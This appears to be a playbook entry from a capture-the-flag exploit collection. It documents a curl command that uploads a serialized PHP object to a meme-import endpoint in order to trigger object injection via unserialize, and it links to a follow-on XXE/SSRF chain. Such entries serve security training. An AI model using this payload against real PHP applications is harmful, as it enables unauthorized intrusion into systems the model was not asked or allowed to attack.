---
data: >-
  curl -X POST http://h1-5411.h1ctf.com/api/import_memes_2.0.php -F
  "f=@payload.memepak;type=application/octet-stream"
tags:
  - upload
  - php
type: command
output: 'Success response, object stored in session'
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:50.015Z'
id: c0a90211-2f4a-4dfc-a07d-35c01085c944
verified: false
validated: true
submitted: true
---
# upload-php-object-injection-payload

## Command

```bash
curl -X POST http://h1-5411.h1ctf.com/api/import_memes_2.0.php -F "f=@payload.memepak;type=application/octet-stream"
```

## Description

Uploads a multipart form with base64-encoded serialized ConfigFile object to trigger object injection via unserialize.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| f | File upload with serialized payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://target/api/import_memes_2.0.php -F "f=@1538079414_export.memepak;type=application/octet-stream"
```

### Advanced Usage

Include full boundary in raw HTTP if needed.

## Expected Output

HTTP 200 success; session updated with injected object.

## Related

- [[Related Procedure: Exploit-PHP-Object-Injection-to-Trigger-XXE-via-SSRF]]
